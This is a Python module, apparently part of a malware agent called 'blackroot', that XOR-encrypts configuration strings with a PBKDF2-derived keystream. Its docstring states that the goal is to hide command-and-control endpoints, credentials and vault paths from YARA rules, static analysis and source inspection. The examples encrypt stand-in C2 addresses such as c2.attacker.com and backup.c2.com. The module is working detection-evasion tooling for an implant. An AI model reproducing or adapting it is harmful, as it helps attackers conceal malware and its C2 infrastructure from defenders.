"""
String-Level XOR Encryption Module
=====================================================
Purpose: Encrypt all plaintext configuration strings, credentials, and C2 endpoints
so they don't appear in source code, memory dumps, or static analysis.

Strategy: XOR-based encryption with key rotation per deployment ID
- Fast: No heavy crypto operations (10-50x faster than AES)
- Reversible: XOR encryption/decryption are identical operations
- Per-byte key rotation: Prevents pattern detection via repeated plaintext
- PBKDF2 derivation: Deterministic key generation from deployment_id

Usage:
    1. Encrypt sensitive strings at deployment time
    2. Store encrypted values in config.json as hex strings
    3. Decrypt on agent initialization (Phase 1)
    4. Cache decrypted strings in SecureMemoryPool (AES-256-GCM encrypted in memory)

Threat Model: Defeats
    - Static string analysis (YARA rules scanning for hardcoded strings)
    - Memory dumps at rest (strings are XOR-encrypted in config)
    - Source code inspection (only encrypted tokens visible)
    
Does NOT defeat:
    - Memory forensics at runtime (decrypted strings in memory)
    - Key derivation brute-force (PBKDF2 iterations intentionally low for speed, ~10K)

Integration Points:
    - config_encryptor.py: Decrypt encrypted strings on first use
    - blackroot_agent_init.py Phase 1: Call decrypt_all_config_strings()
    - SecureMemoryPool: Cache decrypted strings (AES-256-GCM at-rest encryption)
"""

import hashlib
import secrets
from typing import Dict, Tuple
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend


class StringEncryptor:
    """XOR-based string encryption with key rotation."""
    
    # Constants
    PBKDF2_ITERATIONS = 5000  # Low for speed (deployment time, not crypto-grade)
    KEY_LENGTH = 32  # 256 bits for full key
    VERSION = 1  # Encryption format version (allows future upgrades)
    
    def __init__(self, deployment_id: str):
        """
        Initialize encryptor with deployment-specific key.
        
        Args:
            deployment_id: Unique deployment identifier (e.g., "prod-deploy-2026-04")
                          Used as PBKDF2 seed for deterministic key generation
        """
        self.deployment_id = deployment_id
        self.master_key = self._derive_master_key(deployment_id)
    
    def _derive_master_key(self, deployment_id: str) -> bytes:
        """
        Derive 256-bit master key from deployment ID using PBKDF2-SHA256.
        
        Args:
            deployment_id: Deployment identifier string
            
        Returns:
            32-byte master key
            
        Design: PBKDF2 with 5000 iterations (fast, not cryptographic strength)
                Sufficient to prevent quick dictionary attacks on deployment_id
        """
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=self.KEY_LENGTH,
            salt=b"StringEncryptor_v1",  # Fixed salt (not secret)
            iterations=self.PBKDF2_ITERATIONS,
            backend=default_backend()
        )
        return kdf.derive(deployment_id.encode())
    
    def _generate_key_rotation(self, length: int) -> bytes:
        """
        Generate rotating XOR key stream.
        
        Args:
            length: Number of bytes to generate
            
        Returns:
            Rotating key stream (length bytes)
            
        Design: PBKDF2 of (master_key + counter) to generate deterministic
                key rotation. Same deployment_id always produces same key rotation.
        """
        # Use PBKDF2HMAC to expand master key into long keystream
        # This ensures deterministic rotation (same deployment_id → same keystream)
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=length,
            salt=self.master_key[:16],  # Use first 16 bytes of master key as salt
            iterations=1,  # Single iteration (we're not deriving, just expanding)
            backend=default_backend()
        )
        return kdf.derive(self.master_key)
    
    def xor_encrypt(self, plaintext: str) -> str:
        """
        Encrypt plaintext string using XOR with rotating key.
        
        Args:
            plaintext: String to encrypt (e.g., "https://c2.attacker.com")
            
        Returns:
            Hex-encoded encrypted string (e.g., "48656C6C6F")
            
        Algorithm:
            1. Generate rotating XOR key (len(plaintext) bytes)
            2. Convert plaintext to bytes
            3. XOR each byte: ciphertext[i] = plaintext[i] ^ key[i]
            4. Return hex-encoded string
            
        Properties:
            - Reversible: xor_decrypt(xor_encrypt(x)) == x
            - Fast: Single pass through plaintext
            - Pattern-resistant: Key rotation prevents same-plaintext repetition
        """
        plaintext_bytes = plaintext.encode('utf-8')
        key = self._generate_key_rotation(len(plaintext_bytes))
        
        # XOR encryption: ciphertext = plaintext ^ key
        ciphertext = bytes(p ^ k for p, k in zip(plaintext_bytes, key))
        
        # Return hex-encoded for safe storage in JSON/YAML
        return ciphertext.hex()
    
    def xor_decrypt(self, ciphertext_hex: str) -> str:
        """
        Decrypt hex-encoded ciphertext using XOR with rotating key.
        
        Args:
            ciphertext_hex: Hex-encoded encrypted string (e.g., "48656C6C6F")
            
        Returns:
            Plaintext string (e.g., "https://c2.attacker.com")
            
        Algorithm:
            1. Decode hex to bytes
            2. Generate same rotating XOR key (determined by deployment_id)
            3. XOR each byte: plaintext[i] = ciphertext[i] ^ key[i]
            4. Decode bytes to UTF-8 string
            
        Note: XOR is self-inverse, so decrypt is identical to encrypt
        """
        ciphertext = bytes.fromhex(ciphertext_hex)
        key = self._generate_key_rotation(len(ciphertext))
        
        # XOR decryption: plaintext = ciphertext ^ key (same operation)
        plaintext_bytes = bytes(c ^ k for c, k in zip(ciphertext, key))
        
        return plaintext_bytes.decode('utf-8')
    
    def encrypt_string_dict(self, strings_dict: Dict[str, str]) -> Dict[str, str]:
        """
        Encrypt all strings in a dictionary.
        
        Args:
            strings_dict: Dict of {name: plaintext_value} to encrypt
                         e.g., {"C2_ENDPOINT": "https://c2.evil.com", "VAULT_PATH": "~/.blackvault"}
            
        Returns:
            Dict of {name: encrypted_hex} with same keys
            
        Use Case:
            secrets = {
                "C2_ENDPOINT": "https://c2.attacker.com",
                "VAULT_PATH": "~/.blackvault",
                "CREDENTIAL_MARKER": "BLACKROOT_"
            }
            encrypted = encryptor.encrypt_string_dict(secrets)
            # Result: {"C2_ENDPOINT": "a1b2c3d4...hex", ...}
        """
        return {name: self.xor_encrypt(value) for name, value in strings_dict.items()}
    
    def decrypt_string_dict(self, encrypted_dict: Dict[str, str]) -> Dict[str, str]:
        """
        Decrypt all strings in a dictionary.
        
        Args:
            encrypted_dict: Dict of {name: encrypted_hex}
            
        Returns:
            Dict of {name: plaintext_value} with same keys
        """
        return {name: self.xor_decrypt(value) for name, value in encrypted_dict.items()}
    
    def create_encrypted_config_section(self, section_name: str, strings_dict: Dict[str, str]) -> Dict:
        """
        Create encrypted configuration section for JSON/YAML storage.
        
        Args:
            section_name: Name of config section (e.g., "encrypted_strings")
            strings_dict: Dict of plaintext strings to encrypt
            
        Returns:
            Dict with encrypted values and metadata:
            {
                "encrypted_strings": {
                    "C2_ENDPOINT": "a1b2c3d4...hex",
                    "VAULT_PATH": "e5f6g7h8...hex"
                },
                "encryption_metadata": {
                    "version": 1,
                    "deployment_id": "prod-2026-04",
                    "iterations": 5000
                }
            }
        """
        encrypted = self.encrypt_string_dict(strings_dict)
        
        return {
            section_name: encrypted,
            "encryption_metadata": {
                "version": self.VERSION,
                "deployment_id": self.deployment_id,
                "iterations": self.PBKDF2_ITERATIONS,
                "algorithm": "XOR-PBKDF2"
            }
        }


def encrypt_config_strings(deployment_id: str, sensitive_strings: Dict[str, str]) -> Dict:
    """
    Utility function: Create encrypted config section.
    
    Args:
        deployment_id: Deployment identifier (e.g., "prod-2026-04-01")
        sensitive_strings: Dict of {name: plaintext} strings to encrypt
        
    Returns:
        Full config section with encrypted values + metadata
        
    Example:
        config_section = encrypt_config_strings(
            deployment_id="prod-2026-04",
            sensitive_strings={
                "C2_ENDPOINT": "https://c2.attacker.com:8443",
                "C2_ENDPOINT_FALLBACK": "https://backup.c2.com:8443",
                "VAULT_PATH": "~/.blackvault",
                "AGENT_ID_PREFIX": "BLACKROOT_",
                "CREDENTIAL_MARKER": "VAULT_CREDENTIAL_",
            }
        )
        # Returns:
        # {
        #     "encrypted_strings": { ... encrypted dict ... },
        #     "encryption_metadata": { ... version, deployment_id, iterations ... }
        # }
    """
    encryptor = StringEncryptor(deployment_id)
    return encryptor.create_encrypted_config_section("encrypted_strings", sensitive_strings)


def decrypt_config_strings(encrypted_section: Dict, deployment_id: str) -> Dict[str, str]:
    """
    Utility function: Decrypt config section.
    
    Args:
        encrypted_section: Full config section with "encrypted_strings" and "encryption_metadata"
        deployment_id: Deployment identifier (must match encryption time)
        
    Returns:
        Dict of decrypted {name: plaintext} strings
        
    Raises:
        ValueError: If deployment_id doesn't match encryption metadata
        KeyError: If encrypted section format invalid
    """
    metadata = encrypted_section.get("encryption_metadata", {})
    
    # Validate deployment ID matches
    if metadata.get("deployment_id") != deployment_id:
        raise ValueError(
            f"Deployment ID mismatch: encrypted for '{metadata.get('deployment_id')}', "
            f"but decrypting with '{deployment_id}'. Cannot decrypt."
        )
    
    encryptor = StringEncryptor(deployment_id)
    encrypted_strings = encrypted_section.get("encrypted_strings", {})
    return encryptor.decrypt_string_dict(encrypted_strings)


if __name__ == "__main__":
    # Example usage
    import json
    
    # Initialize encryptor with deployment ID
    deployment_id = "test-deployment-2026-04"
    encryptor = StringEncryptor(deployment_id)
    
    # Sensitive strings to encrypt
    secrets = {
        "C2_ENDPOINT": "https://c2.attacker.com:8443",
        "C2_ENDPOINT_FALLBACK": "https://backup.c2.com:8443",
        "VAULT_PATH": "~/.blackvault",
        "VAULT_KEY_FILE": "~/.blackvault/.key",
        "AGENT_ID_PREFIX": "BLACKROOT_",
    }
    
    print("[*] Encrypting configuration strings...")
    encrypted_config = encrypt_config_strings(deployment_id, secrets)
    print(f"[+] Encrypted config:\n{json.dumps(encrypted_config, indent=2)}")
    
    print("\n[*] Decrypting configuration strings...")
    decrypted = decrypt_config_strings(encrypted_config, deployment_id)
    print(f"[+] Decrypted config:\n{json.dumps(decrypted, indent=2)}")
    
    print("\n[*] Verifying roundtrip...")
    for name, original_value in secrets.items():
        decrypted_value = decrypted.get(name)
        match = "✓" if decrypted_value == original_value else "✗"
        print(f"{match} {name}: {original_value} → {decrypted_value}")
    
    print("\n[*] Testing with different deployment ID (should fail)...")
    try:
        bad_decrypted = decrypt_config_strings(encrypted_config, "wrong-deployment-id")
        print("✗ ERROR: Should have raised ValueError!")
    except ValueError as e:
        print(f"✓ Correctly raised ValueError: {e}")
